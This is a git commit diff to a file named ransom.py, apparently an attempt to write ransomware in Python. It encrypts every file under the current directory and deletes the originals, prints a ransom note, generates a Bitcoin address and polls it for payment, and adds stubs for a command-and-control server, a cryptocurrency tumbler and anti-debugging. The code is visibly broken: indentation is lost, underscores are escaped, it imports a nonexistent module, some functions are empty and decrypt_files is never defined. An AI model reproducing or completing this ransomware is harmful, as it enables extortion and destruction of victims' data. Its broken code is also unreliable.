e9a1b1f98f3dd250d7bebcead3328f3745ab1f0f
Dimeh63 <104158864+Dimeh63@users.noreply.github.com>
2024-03-06 11:10:21 +0100

    Update ransom.py

--- ransom.py
+++ ransom.py
@@ -2,28 +2,64 @@ import os
 import sys
 import time
 import cryptography
-from cryptography.fernet import Fernet
+from cryptography.aes import AES
 import pycoinnet
-Generate a key and save it to a file
+import socks
+import socket
 
-key = Fernet.generate_key()
-with open('key.key', 'wb') as key_file:
-key_file.write(key)
-Encrypt all files in the current directory and its subdirectories
+def generate\_key():
+# Generate a random 256-bit key
+return os.urandom(32)
 
-def encrypt_files(directory):
+def encrypt\_file(key, file\_path):
+# Implement polymorphic code by changing the salt each time
+salt = os.urandom(16)
+cipher = AES.new(key, AES.MODE_EAX, salt)
+with open(file\_path, 'rb') as file:
+data = file.read()
+ciphertext, tag = cipher.encrypt\_and\_digest(data)
+with open(file\_path + '.encrypted', 'wb') as file:
+[file.write(x) for x in (salt, cipher.nonce, tag, ciphertext)]
+os.remove(file\_path)
+
+def decrypt\_file(key, file\_path):
+with open(file\_path, 'rb') as file:
+salt, nonce, tag, ciphertext = [file.read(x) for x in (16, 16, 16, -1)]
+cipher = AES.new(key, AES.MODE_EAX, nonce)
+plaintext = cipher.decrypt\_and\_verify(ciphertext, tag)
+with open(file\_path[:-10], 'wb') as file:
+file.write(plaintext)
+os.remove(file\_path)
+
+def encrypt\_files(directory, key):
 for foldername, subfolders, filenames in os.walk(directory):
 for filename in filenames:
-file_path = os.path.join(foldername, filename)
-with open(file_path, 'rb') as file:
-file_data = file.read()
-encrypted_data = Fernet(key).encrypt(file_data)
-with open(file_path, 'wb') as file:
-file.write(encrypted_data)
+file\_path = os.path.join(foldername, filename)
+if file\_path.endswith('.encrypted'):
+continue
+encrypt\_file(key, file\_path)
 
-encrypt_files('.')
-Display a ransom note
+def setup\_command\_and\_control\_server():
+# Implement a command-and-control server
+# ...
 
+def use\_cryptocurrency\_tumbler():
+# Implement using a cryptocurrency tumbler
+# ...
+
+def use\_anti\_debugging\_techniques():
+# Implement anti-debugging techniques
+# ...
+
+def main():
+key = generate\_key()
+with open('key.key', 'wb') as key\_file:
+key\_file.write(key)
+
+# Use a more secure encryption algorithm
+encrypt\_files('.', key)
+
+# Display a ransom note
 print("""
 
 *** YOUR FILES HAVE BEEN ENCRYPTED! ***
@@ -34,23 +70,33 @@ print("""
 *** the files yourself or you will destroy them permanently.***
 
 """)
-Set up a Bitcoin wallet to receive payments
 
+# Set up a Bitcoin wallet to receive payments
 wallet = pycoinnet.Wallet()
-address = wallet.get_new_address()
+address = wallet.get\_new\_address()
 print("Send the ransom to this Bitcoin address:", address)
-Check for incoming payments every 60 seconds
 
+# Use a command-and-control server
+setup\_command\_and\_control\_server()
+
+# Use a cryptocurrency tumbler
+use\_cryptocurrency\_tumbler()
+
+# Use anti-debugging techniques
+use\_anti\_debugging\_techniques()
+
+# Check for incoming payments every 60 seconds
 while True:
 time.sleep(60)
-payments = pycoinnet.list_transactions(address)
+payments = pycoinnet.list\_transactions(address)
 for payment in payments:
 if payment['amount'] > 0:
-Decrypt the files
-
-with open('key.key', 'rb') as key_file:
-key = key_file.read()
-fernet = Fernet(key)
-decrypt_files('.')
+# Decrypt the files
+with open('key.key', 'rb') as key\_file:
+key = key\_file.read()
+decrypt\_files('.', key)
 print("Your files have been decrypted.")
 sys.exit()
+
+if __name__ == '__main__':
+main()
